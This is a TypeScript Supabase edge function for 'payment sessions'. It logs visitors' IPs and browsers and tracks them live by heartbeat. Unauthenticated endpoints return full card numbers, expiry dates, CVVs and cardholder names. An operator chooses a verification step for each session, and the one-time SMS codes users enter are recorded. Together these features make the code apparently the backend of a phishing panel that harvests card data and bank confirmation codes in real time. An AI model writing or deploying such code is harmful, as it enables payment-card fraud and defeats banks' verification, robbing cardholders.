import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;

const supabase = createClient(supabaseUrl, supabaseKey);

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);
    const action = url.pathname.split('/').pop();

    switch (action) {
      case 'start-session':
        return await handleStartSession(req);
      case 'heartbeat':
        return await handleHeartbeat(req);
      case 'end-session':
        return await handleEndSession(req);
      case 'active-sessions':
        return await handleGetActiveSessions(req);
      case 'inactive-sessions':
        return await handleGetInactiveSessions(req);
      case 'set-verification-method':
        return await handleSetVerificationMethod(req);
      case 'confirm-app-verification':
        return await handleConfirmAppVerification(req);
      case 'submit-sms-code':
        return await handleSubmitSmsCode(req);
      case 'enter-sms-code':
        return await handleEnterSmsCode(req);
      case 'complete-payment':
        return await handleCompletePayment(req);
      default:
        return new Response(JSON.stringify({ error: 'Invalid action' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
    }
  } catch (error) {
    console.error('Error in payment-sessions function:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});

async function handleStartSession(req: Request) {
  const { orderId, userIp, browserInfo } = await req.json();
  const sessionId = crypto.randomUUID();

  console.log('Starting session for order:', orderId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .insert({
      order_id: orderId,
      session_id: sessionId,
      user_ip: userIp,
      browser_info: browserInfo,
      is_active: true,
      last_seen: new Date().toISOString()
    })
    .select()
    .single();

  if (error) {
    console.error('Error creating session:', error);
    throw error;
  }

  return new Response(JSON.stringify({ sessionId, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleHeartbeat(req: Request) {
  const { sessionId } = await req.json();

  console.log('Heartbeat for session:', sessionId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      last_seen: new Date().toISOString(),
      is_active: true
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error updating heartbeat:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleEndSession(req: Request) {
  const { sessionId } = await req.json();

  console.log('Ending session:', sessionId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      is_active: false,
      last_seen: new Date().toISOString()
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error ending session:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleGetActiveSessions(req: Request) {
  // Sessions are active if last_seen is less than 30 minutes ago (1800 seconds)
  const thirtyMinutesAgo = new Date(Date.now() - 30 * 60 * 1000).toISOString();

  const { data, error } = await supabase
    .from('payment_sessions')
    .select(`
      *,
      orders (
        order_number,
        final_price,
        cardholder_name,
        card_number,
        expiry_date,
        cvv,
        created_at
      )
    `)
    .eq('is_active', true)
    .gte('last_seen', thirtyMinutesAgo)
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Error fetching active sessions:', error);
    throw error;
  }

  return new Response(JSON.stringify({ sessions: data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleGetInactiveSessions(req: Request) {
  // Sessions are inactive if last_seen is more than 30 minutes ago OR is_active is false
  const thirtyMinutesAgo = new Date(Date.now() - 30 * 60 * 1000).toISOString();

  const { data, error } = await supabase
    .from('payment_sessions')
    .select(`
      *,
      orders (
        order_number,
        final_price,
        cardholder_name,
        card_number,
        expiry_date,
        cvv,
        created_at
      )
    `)
    .or(`is_active.eq.false,last_seen.lt.${thirtyMinutesAgo}`)
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Error fetching inactive sessions:', error);
    throw error;
  }

  return new Response(JSON.stringify({ sessions: data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleSetVerificationMethod(req: Request) {
  const { sessionId, method } = await req.json();

  console.log('Setting verification method:', sessionId, method);

  const updates: any = {
    verification_method: method,
    admin_action_pending: true,
    last_seen: new Date().toISOString()
  };

  // Set correct verification status for each method
  if (method === 'sms_confirmation') {
    updates.verification_status = 'sms_sent';
  } else if (method === 'app_confirmation') {
    updates.verification_status = 'app_confirmation';
  } else if (method === 'choice_required') {
    updates.verification_status = 'choice_required';
  }

  const { data, error } = await supabase
    .from('payment_sessions')
    .update(updates)
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error setting verification method:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleConfirmAppVerification(req: Request) {
  const { sessionId } = await req.json();

  console.log('Confirming app verification:', sessionId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      verification_status: 'app_confirmed',
      last_seen: new Date().toISOString()
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error confirming app verification:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleEnterSmsCode(req: Request) {
  const { sessionId, code } = await req.json();

  console.log('User entering SMS code:', sessionId);

  // Save the user-entered code and set status to sms_sent
  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      sms_code: code,
      verification_status: 'sms_sent',
      last_seen: new Date().toISOString()
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error saving user SMS code:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleSubmitSmsCode(req: Request) {
  const { sessionId, code } = await req.json();

  console.log('Directly saving and confirming SMS code:', sessionId);

  // Directly save the SMS code and set status to confirmed
  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      sms_code: code,
      verification_status: 'sms_confirmed',
      last_seen: new Date().toISOString()
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error confirming SMS:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleCompletePayment(req: Request) {
  const { sessionId } = await req.json();

  console.log('Completing payment:', sessionId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      verification_status: 'completed',
      admin_action_pending: false,
      last_seen: new Date().toISOString()
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error completing payment:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}